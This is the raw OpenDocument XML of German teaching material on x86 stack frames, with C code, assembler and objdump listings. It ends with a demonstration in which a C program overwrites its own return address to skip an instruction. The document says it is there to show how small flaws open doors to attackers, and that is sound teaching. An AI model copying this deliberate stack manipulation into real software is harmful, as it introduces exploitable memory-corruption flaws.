          <text:p text:style-name="P37">Jetzt werden die l<text:span text:style-name="T4">okalen Variablen </text:span>der Funktion my_func() eingerichtet, und die Funktion arbeitet die einzelnen Befehle ab.<text:line-break/><text:soft-page-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P37">Am Schluss, wenn diese Funktion beendet ist, springt sie wieder zur main()-Funktion zurück. Dies geschieht mit dem Assembler-Befehl <text:span text:style-name="T4">RET</text:span>, der auf die vom Stack gesicherte Adresse <text:span text:style-name="T4">zurückspringt</text:span>.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="P14">jedem Funktionsaufruf wird also ein eigener Stack-Frame zugeordnet.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1900_390052085"/>Die CPU-Register zur Stack-Verwaltung<text:bookmark-end text:name="__RefHeading__1900_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list165240190" text:continue-list="list609016426" text:style-name="List_20_3">
        <text:list-item>
          <text:p text:style-name="P34">EBP Der BasePointer<text:line-break/>ist die Basis des jeweiligen Stack-Frames eines Funktionsaufrufes<text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P34">ESP<text:tab/>Der StackPointer; <text:line-break/>wird verringert, wenn ein Wert auf den Stack gelegt wird (Bsp.: push(1))<text:line-break/>wird erhöht, wenn ein Wert vom Stack geholt wird (Bsp.: pop())<text:line-break/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1902_390052085"/>Beispiel-Assembler-Code für den Aufruf einer Funktion (caller)<text:bookmark-end text:name="__RefHeading__1902_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="code">...</text:p>
      <text:p text:style-name="code">push<text:tab/>2</text:p>
      <text:p text:style-name="code">push<text:tab/>1</text:p>
      <text:p text:style-name="code">call<text:tab/>my_func</text:p>
      <text:p text:style-name="code">add<text:tab/>esp,8<text:tab/><text:tab/>; es wurden zuvor 2 int(=2*4 Bytes) auf den Stack gelegt</text:p>
      <text:p text:style-name="code"><text:tab/><text:tab/><text:tab/>; d.h. Der Stack-Frame ist nun wieder leer.<text:line-break/><text:tab/><text:tab/><text:tab/>; <text:span text:style-name="T12">weil der Stack von 'oben nach unten wandert'<text:line-break/><text:tab/><text:tab/><text:tab/>; wird bei einem POP der ESP addiert</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="P36" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1904_390052085"/>Beispiel-Assembler-Code für die aufgerufene Funktion (callee)<text:bookmark-end text:name="__RefHeading__1904_390052085"/></text:h>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="code">080483e4 &lt;my_func&gt;:</text:p>
      <text:p text:style-name="P5">; PROLOG</text:p>
      <text:p text:style-name="P5"><text:s/>push <text:s text:c="2"/>%ebp<text:tab/><text:tab/>; STACK-FRAME einrichten</text:p>
      <text:p text:style-name="P5"><text:s/>mov <text:s text:c="3"/>%esp,%ebp<text:line-break/></text:p>
      <text:p text:style-name="P5"><text:s/>sub <text:s text:c="3"/>$0x10,%esp<text:tab/>; Platz für Parameter, Rücksprungadresse, lok.Var.</text:p>
      <text:p text:style-name="P17"><text:tab/><text:tab/><text:tab/><text:tab/>; <text:span text:style-name="T12">entspricht einem PUSH von 16 Bytes</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/>; (2xint + ret-Adr + 1xint)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/>; wert1,wert2 + ret-Adr + summe<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T13">4 + <text:s text:c="3"/>4 <text:s text:c="3"/>+ 4 <text:s text:c="6"/>+ 4</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P16">; die eigentliche Funktion</text:p>
      <text:p text:style-name="P16">…</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P17">; EPILOG</text:p>
      <text:p text:style-name="P17"><text:s/>mov %ebp, %esp<text:tab/><text:tab/>; Speicher f. Lok. Variblen freigeben</text:p>
      <text:p text:style-name="P17"><text:s/>pop %ebp<text:tab/><text:tab/><text:tab/>; Base-Pointer vom Aufrufer wieder herstellen</text:p>
      <text:p text:style-name="P17"><text:s/>ret<text:tab/><text:tab/><text:tab/><text:tab/>; Rücksprungadresse in den InstructionPointer laden</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1906_390052085"/><text:soft-page-break/>Assembler-Code/Maschinen-Code (stackframe.c)<text:bookmark-end text:name="__RefHeading__1906_390052085"/></text:h>
      <text:p text:style-name="Text_20_body">Hier nochmals der Quellcode</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="code">/* stackframe.c </text:p>
      <text:p text:style-name="code"><text:s/>* gcc stackframe.c -o stackframe.exe</text:p>
      <text:p text:style-name="code"><text:s/>*/</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="code">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int my_func(int wert1, int wert2) {</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>int summe;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:s text:c="3"/>summe = wert1+wert2;</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>return summe;</text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int main(void) {</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>int ergebnis;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:tab/>ergebnis= my_func(1,2);</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:tab/>printf("ergebnis: %d \n", ergebnis);</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:tab/>return 0;</text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Übersetzen Sie das Programm mit</text:p>
      <text:p text:style-name="code">gcc stackframe.c -o stackframe.exe</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Wir wollen nun den Assembler-Code/Maschinen-Code vom obigen Programm stackframe.c ansehen.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="code">objdump -d stackframe.exe</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="code">...</text:p>
      <text:p text:style-name="code"><text:span text:style-name="T14">080483e4 &lt;my_func&gt;</text:span>:</text:p>
      <text:p text:style-name="code"><text:s/>80483e4:<text:tab/>55 <text:s text:c="18"/><text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="code"><text:s/>80483e5:<text:tab/>89 e5 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="code"><text:s/>80483e7:<text:tab/>83 ec 10 <text:s text:c="12"/><text:tab/>sub <text:s text:c="3"/>$0x10,%esp</text:p>
      <text:p text:style-name="code"><text:s/>80483ea:<text:tab/>8b 45 0c <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>0xc(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483ed:<text:tab/>8b 55 08 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>0x8(%ebp),%edx</text:p>
      <text:p text:style-name="code"><text:s/>80483f0:<text:tab/>01 d0 <text:s text:c="15"/><text:tab/>add <text:s text:c="3"/>%edx,%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483f2:<text:tab/>89 45 fc <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,-0x4(%ebp)</text:p>
      <text:p text:style-name="code"><text:s/>80483f5:<text:tab/>8b 45 fc <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x4(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483f8:<text:tab/>c9 <text:s text:c="18"/><text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="code"><text:s/>80483f9:<text:tab/><text:span text:style-name="T4">c3</text:span> <text:s text:c="18"/><text:tab/><text:span text:style-name="T4">ret</text:span> <text:s text:c="3"/></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">080483fa &lt;main&gt;:</text:p>
      <text:p text:style-name="code"><text:s/>80483fa:<text:tab/><text:span text:style-name="T4">55</text:span> <text:s text:c="18"/><text:tab/><text:span text:style-name="T4">push <text:s text:c="2"/>%ebp</text:span></text:p>
      <text:p text:style-name="code"><text:soft-page-break/><text:s/>80483fb:<text:tab/>89 e5 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="code"><text:s/>80483fd:<text:tab/>83 e4 f0 <text:s text:c="12"/><text:tab/>and <text:s text:c="3"/>$0xfffffff0,%esp</text:p>
      <text:p text:style-name="code"><text:s/>8048400:<text:tab/>83 ec 20 <text:s text:c="12"/><text:tab/>sub <text:s text:c="3"/>$0x20,%esp</text:p>
      <text:p text:style-name="code"><text:s/>8048403:<text:tab/>c7 44 24 04 02 00 00 <text:tab/>movl <text:s text:c="2"/>$0x2,0x4(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>804840a:<text:tab/>00 </text:p>
      <text:p text:style-name="code"><text:s/>804840b:<text:tab/>c7 04 24 01 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x1,(%esp)</text:p>
      <text:p text:style-name="P5"><text:s/>8048412:<text:tab/>e8 cd ff ff ff <text:s text:c="6"/><text:tab/>call <text:s text:c="2"/><text:span text:style-name="T14">80483e4 &lt;my_func&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:s/>8048417:<text:tab/>89 44 24 1c <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%eax,0x1c(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>804841b:<text:tab/>b8 10 85 04 08 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x8048510,%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048420:<text:tab/>8b 54 24 1c <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%edx</text:p>
      <text:p text:style-name="code"><text:s/>8048424:<text:tab/>89 54 24 04 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%edx,0x4(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>8048428:<text:tab/>89 04 24 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>804842b:<text:tab/>e8 d0 fe ff ff <text:s text:c="6"/><text:tab/>call <text:s text:c="2"/>8048300 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="code"><text:s/>8048430:<text:tab/>b8 00 00 00 00 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x0,%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048435:<text:tab/>c9 <text:s text:c="18"/><text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="code"><text:s/>8048436:<text:tab/><text:span text:style-name="T4">c3</text:span> <text:s text:c="18"/><text:tab/><text:span text:style-name="T4">ret</text:span> <text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:s/>8048437:<text:tab/><text:span text:style-name="T4">90</text:span> <text:s text:c="18"/><text:tab/><text:span text:style-name="T4">nop</text:span></text:p>
      <text:p text:style-name="code"><text:s/>...</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="Text_20_body">In der linken Spalte befindet sich der Adressspeicher. An der Adresse »<text:span text:style-name="T4">080483e4</text:span>« fängt in diesem Beispiel die Funktion my_func() an. </text:p>
      <text:p text:style-name="Text_20_body">Diese Adresse wurde zuvor etwa von der main()-Funktion mit</text:p>
      <text:p text:style-name="code">main:</text:p>
      <text:p text:style-name="code">…</text:p>
      <text:p text:style-name="P6"><text:s/>8048412:<text:tab/>e8 cd ff ff ff <text:s text:c="6"/><text:tab/><text:span text:style-name="T14">call <text:s text:c="2"/></text:span><text:span text:style-name="T15">80483e4</text:span><text:span text:style-name="T14"> &lt;my_func&gt;</text:span></text:p>
      <text:p text:style-name="code">…</text:p>
      <text:p text:style-name="Text_20_body">aufgerufen. </text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">In der zweiten Spalte befindet sich der <text:span text:style-name="T4">Maschinencode</text:span> (<text:span text:style-name="T4">Opcode</text:span>). Dieser Code ist schwer für den Menschen nachvollziehbar. Aber alle Zahlen haben ihre Bedeutung. </text:p>
      <text:p text:style-name="Text_20_body">So steht z. B. die Zahl </text:p>
      <text:list xml:id="list1134049189" text:continue-numbering="true" text:style-name="List_20_3">
        <text:list-item>
          <text:p text:style-name="P24">»<text:span text:style-name="T4">55</text:span>« für push %ebp, was den Basis-Pointer auf dem Stack sichert, und </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P24">»<text:span text:style-name="T4">c3</text:span>« bedeutet ret, also return. Mit »c3« wird also wieder an die Rücksprungadresse gesprungen, die in der main()-Funktion ebenfalls auf den Stack gepusht wurde. Häufig finden Sie den Maschinencode </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P24">»<text:span text:style-name="T4">90</text:span>« (nop), der nichts anderes macht, als Zeit des Prozessors zu vertrödeln. </text:p>
          <text:p text:style-name="P34"/>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1908_390052085"/><text:bookmark text:name="t2t34"/>Rücksprungadresse manipulieren<text:bookmark-end text:name="__RefHeading__1908_390052085"/></text:h>
      <text:p text:style-name="Text_20_body">In diesem Abschnitt folgt ein Beispiel, das zeigt, wie die Rücksprungadresse manipuliert werden kann.</text:p>
      <text:p text:style-name="Text_20_body">Es ist hierbei nicht Ziel und Zweck, Ihnen eine Schritt-für-Schritt-Anleitung zur Programmierung eines Exploits an die Hand zu geben und bewusst einen Buffer-Overflow zu erzeugen, sondern Ihnen soll vor Augen geführt werden, wie schnell und unbewusst kleine Unstimmigkeiten im Quellcode Hackern Tür und Tor öffnen können – einige Kenntnisse der Funktionsweise von Assemblern vorausgesetzt.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Zur Demonstration des folgenden Beispiels werden der <text:span text:style-name="T4">Compiler</text:span> <text:span text:style-name="T4">gcc</text:span> und der <text:span text:style-name="T4">Diassembler objdump</text:span> verwendet. Das Funktionieren dieses Beispiels ist nicht auf allen Systemen garantiert, da bei den verschiedenen Betriebssystemen zum Teil unterschiedlich auf den Stack <text:soft-page-break/>zugegriffen wird.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Folgendes Listing sei gegeben:</text:p>
      <text:p text:style-name="code">/* stackframe-ret.c */</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="code">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int my_func(int wert1, int wert2) {</text:p>
      <text:p text:style-name="code"><text:tab/>int summe;</text:p>
      <text:p text:style-name="P5"><text:tab/>int* ret;<text:tab/><text:tab/>// Zeiger zum Manipulieren der Rücksprungadresse</text:p>
      <text:p text:style-name="P5"><text:tab/></text:p>
      <text:p text:style-name="P4"><text:tab/>ret= &amp;wert1 - 1;<text:tab/>// Adresse der Rücksprungadresse ermitteln</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>*ret += 12;<text:tab/><text:tab/><text:tab/>// Rücksprungadresse manipulieren</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="code"><text:tab/>summe = wert1+wert2;</text:p>
      <text:p text:style-name="code"><text:s text:c="2"/></text:p>
      <text:p text:style-name="code"><text:tab/>return summe; </text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">int main(void) {</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/>int ergebnis;</text:p>
      <text:p text:style-name="code"><text:tab/>int achtung;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:tab/>achtung=1;</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:tab/>ergebnis= my_func(achtung,2);</text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="P4"><text:tab/>achtung=0;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="code"><text:tab/>printf("achtung: %d \n", achtung);</text:p>
      <text:p text:style-name="code"><text:s text:c="3"/></text:p>
      <text:p text:style-name="code"><text:tab/>return 0;</text:p>
      <text:p text:style-name="code">}</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Übersetzen Sie dieses Programm mit</text:p>
      <text:p text:style-name="code">gcc stackframe-ret.c -o stackframe-ret.exe</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Wenn Sie es ausführen mit</text:p>
      <text:p text:style-name="code">./stackframe-ret.exe</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">erhalten Sie die Ausgabe</text:p>
      <text:p text:style-name="Text_20_body">achtung: 1</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">OBWOHL unmittelbar vor dem printf() <text:s/>achtung=0; gesetzt wird.</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Die Erklärung liegt in der Veränderung der Rücksprungadresse am Stack. </text:p>
      <text:p text:style-name="Text_20_body">Wie kommt man aber zu dem Wert in</text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>*ret += 12</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Hier die Erklärung:</text:p>
      <text:p text:style-name="Text_20_body">Der Stack</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int wert2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">BP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.C1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">High-Adr</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">int wert1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"/>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.C2" table:number-rows-spanned="3" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr1" svg:width="0.272cm" svg:height="1.747cm" svg:x="0.72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table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">RÜCKSPRUNG_ADR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"/>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">int summe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"/>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">int* ret</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">SP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Low-Adr</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P9">ret= &amp;wert1 - 1; // d.h. <text:span text:style-name="T13">r</text:span>et zeigt nun auf RÜCKSPRUNG_ADR</text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16">und mit</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16">*ret += 12; // ERHÖHEN WIR die RÜCKSPRUNGADRESSE<text:line-break/></text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16">d.h. Wir vermuten, dass die Anweisung</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16">achtung=0;</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16">damit sozusagen übersprungen wird!!!</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16">Stimmt!</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P32"><text:span text:style-name="T16">Hier der Beweis:</text:span></text:p>
      <text:p text:style-name="P32">Wir wollen uns zudem den Maschinen-Code und den Assembler-Code betrachten:</text:p>
      <text:p text:style-name="P35"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P32"><text:span text:style-name="T9">die kursiven Teile sind die übersprungenen Anweisungen</text:span></text:p>
      <text:p text:style-name="code">objdump -d stackframe-ret.exe</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="code">...</text:p>
      <text:p text:style-name="code">080483e4 &lt;my_func&gt;:</text:p>
      <text:p text:style-name="code"><text:s/>80483e4:<text:tab/>55 <text:s text:c="18"/><text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="code"><text:s/>80483e5:<text:tab/>89 e5 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="code"><text:s/>80483e7:<text:tab/>83 ec 10 <text:s text:c="12"/><text:tab/>sub <text:s text:c="3"/>$0x10,%esp</text:p>
      <text:p text:style-name="code"><text:s/>80483ea:<text:tab/>8d 45 04 <text:s text:c="12"/><text:tab/>lea <text:s text:c="3"/>0x4(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483ed:<text:tab/>89 45 f8 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,-0x8(%ebp)</text:p>
      <text:p text:style-name="code"><text:s/>80483f0:<text:tab/>8b 45 f8 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x8(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483f3:<text:tab/>8b 00 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>(%eax),%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483f5:<text:tab/>8d 50 0c <text:s text:c="12"/><text:tab/>lea <text:s text:c="3"/>0xc(%eax),%edx</text:p>
      <text:p text:style-name="code"><text:s/>80483f8:<text:tab/>8b 45 f8 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x8(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>80483fb:<text:tab/>89 10 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%edx,(%eax)</text:p>
      <text:p text:style-name="code"><text:s/>80483fd:<text:tab/>8b 45 08 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>0x8(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048400:<text:tab/>03 45 0c <text:s text:c="12"/><text:tab/>add <text:s text:c="3"/>0xc(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048403:<text:tab/>89 45 fc <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,-0x4(%ebp)</text:p>
      <text:p text:style-name="code"><text:s/>8048406:<text:tab/>8b 45 fc <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x4(%ebp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048409:<text:tab/>c9 <text:s text:c="18"/><text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="code"><text:s/>804840a:<text:tab/>c3 <text:s text:c="18"/><text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code">0804840b &lt;main&gt;:</text:p>
      <text:p text:style-name="code"><text:s/>804840b:<text:tab/>55 <text:s text:c="18"/><text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="code"><text:soft-page-break/><text:s/>804840c:<text:tab/>89 e5 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="code"><text:s/>804840e:<text:tab/>83 e4 f0 <text:s text:c="12"/><text:tab/>and <text:s text:c="3"/>$0xfffffff0,%esp</text:p>
      <text:p text:style-name="code"><text:s/>8048411:<text:tab/>83 ec 20 <text:s text:c="12"/><text:tab/>sub <text:s text:c="3"/>$0x20,%esp</text:p>
      <text:p text:style-name="code"><text:s/>8048414:<text:tab/>c7 44 24 18 01 00 00 <text:tab/>movl <text:s text:c="2"/>$0x1,0x18(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>804841b:<text:tab/>00 </text:p>
      <text:p text:style-name="code"><text:s/>804841c:<text:tab/>c7 44 24 04 02 00 00 <text:tab/>movl <text:s text:c="2"/>$0x2,0x4(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>8048423:<text:tab/>00 </text:p>
      <text:p text:style-name="code"><text:s/>8048424:<text:tab/>8b 44 24 18 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>0x18(%esp),%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048428:<text:tab/>89 04 24 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="code"><text:s/><text:span text:style-name="T4">804842b</text:span>:<text:tab/>e8 b4 ff ff ff <text:s text:c="6"/><text:tab/><text:span text:style-name="T4">call <text:s text:c="2"/>80483e4 &lt;my_func&gt;</text:span></text:p>
      <text:p text:style-name="P3"><text:s/><text:span text:style-name="T17">8048430:<text:tab/>89 44 24 1c <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%eax,0x1c(%esp)</text:span></text:p>
      <text:p text:style-name="P43"><text:s/>8048434:<text:tab/>c7 44 24 18 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x0,0x18(%esp)</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T17"><text:s/>804843b:<text:tab/>00</text:span> </text:p>
      <text:p text:style-name="code"><text:s/><text:span text:style-name="T4">804843c:</text:span><text:tab/>b8 30 85 04 08 <text:s text:c="6"/><text:tab/><text:span text:style-name="T4">mov <text:s text:c="3"/>$0x8048530,%eax</text:span></text:p>
      <text:p text:style-name="code"><text:s/>8048441:<text:tab/>8b 54 24 18 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>0x18(%esp),%edx</text:p>
      <text:p text:style-name="code"><text:s/>8048445:<text:tab/>89 54 24 04 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%edx,0x4(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>8048449:<text:tab/>89 04 24 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="code"><text:s/>804844c:<text:tab/>e8 af fe ff ff <text:s text:c="6"/><text:tab/>call <text:s text:c="2"/>8048300 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="code"><text:s/>8048451:<text:tab/>b8 00 00 00 00 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x0,%eax</text:p>
      <text:p text:style-name="code"><text:s/>8048456:<text:tab/>c9 <text:s text:c="18"/><text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="code"><text:s/>8048457:<text:tab/>c3 <text:s text:c="18"/><text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="code">...</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">Sehen wir uns folg. Ausschnitt genauer an:</text:p>
      <text:p text:style-name="code"><text:s/>...</text:p>
      <text:p text:style-name="code"><text:span text:style-name="T4"><text:s/>804842b</text:span>:<text:tab/>e8 b4 ff ff ff <text:s text:c="6"/><text:tab/><text:span text:style-name="T4">call <text:s text:c="2"/>80483e4 &lt;my_func&gt;</text:span></text:p>
      <text:p text:style-name="P43"><text:s/><text:span text:style-name="T4">8048430</text:span>:<text:tab/>89 44 24 1c <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%eax,0x1c(%esp)</text:p>
      <text:p text:style-name="P43"><text:s/>8048434:<text:tab/>c7 44 24 18 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x0,0x18(%esp)</text:p>
